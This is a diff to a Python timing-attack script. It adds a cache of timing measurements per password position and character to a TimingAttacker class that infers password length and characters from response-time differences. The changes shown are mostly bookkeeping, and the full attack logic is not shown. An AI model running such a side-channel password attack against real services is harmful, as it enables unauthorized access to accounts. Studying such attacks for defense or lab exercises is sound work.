@@ -16,7 +16,7 @@ import string
 import time
 
 # ==========================
-# Logging
+# Auxilliary
 # ==========================
 class Logger:
     def __init__(self, enabled: bool = True):
@@ -28,6 +28,38 @@ class Logger:
 
 
 logger = Logger(enabled=False)
+
+class MeasuresCollector:
+    def __init__(self):
+        # posision -> char -> measurements
+        self.measurements: Dict[int, Dict[str, List[int]]] = defaultdict(
+            lambda: defaultdict(list)
+        )
+
+    def add(self, position: int, char: str, new_measurements: List[int]):
+            self.measurements[position][char].extend(new_measurements)
+    
+    def clear(self):
+        self.measurements.clear()
+    
+    def get(self, position: int, char: str) -> List[int]:
+        return self.measurements.get(position, {}).get(char, [])
+    
+    def get_all(self) -> Dict[int, Dict[str, List[int]]]:
+        return {
+            pos: dict(chars)
+            for pos, chars in self.measurements.items()
+        }
+    
+    def get_subset(self, position: int, chars: List[str]) -> Dict[str, List[int]]:
+        if position not in self.measurements:
+            return {}
+
+        return {
+            char: self.measurements[position][char]
+            for char in chars
+            if char in self.measurements[position]
+        }
 
 
 # ==========================
@@ -267,6 +299,7 @@ class TimingAttacker:
         self.base_payload = base_payload
         self.decision_engine = decision_engine
         self.padding = padding
+        self.measures_memory: MeasuresCollector = MeasuresCollector()
 
     async def detect_password_length(self, samples_for_pwd_len: int = 5) -> int:
         """Detect password length by observing timing differences for padded passwords.
@@ -287,6 +320,7 @@ class TimingAttacker:
     async def _measure_candidates(
         self,
         candidates: List[str],
+        posision: int, 
         prefix: str,
         suffix: str,
         new_samples_per_candidate: int
@@ -311,9 +345,13 @@ class TimingAttacker:
         tasks = [get_samples_for_char(char) for char in candidates]
         results = await asyncio.gather(*tasks, return_exceptions=False)
 
-        measures: Dict[str, List[int]] = {}
+
         for char, samples in results:
-            measures[char] = samples
+            self.measures_memory.add(posision, char, samples)
+
+        measures: Dict[str, List[int]]
+        measures = self.measures_memory.get_subset(posision, candidates)
+        print(measures)
 
         return measures
 
@@ -335,6 +373,7 @@ class TimingAttacker:
 
     async def _attack_position(
         self,
+        posision: int,
         prefix: str,
         suffix: str,
         top_k: int,
@@ -361,7 +400,7 @@ class TimingAttacker:
             logger.log(f"       round num {round_number} | candidates: {candidates} | samples_p_candidates: {samples_per_candidate}")
             
             candidates_samples = await self._measure_candidates(
-                candidates, prefix, suffix, samples_per_candidate
+                candidates, posision, prefix, suffix, samples_per_candidate
             )
             gap, best_char = self._calc_gap(candidates_samples)
 
@@ -438,6 +477,7 @@ class TimingAttacker:
             logger.log(f"    Attack position {pos} | prefix: {password} suffix: {suffix}")
 
             next_char = await self._attack_position(
+                posision=pos,
                 prefix=password,
                 suffix=suffix,
                 top_k=top_k,
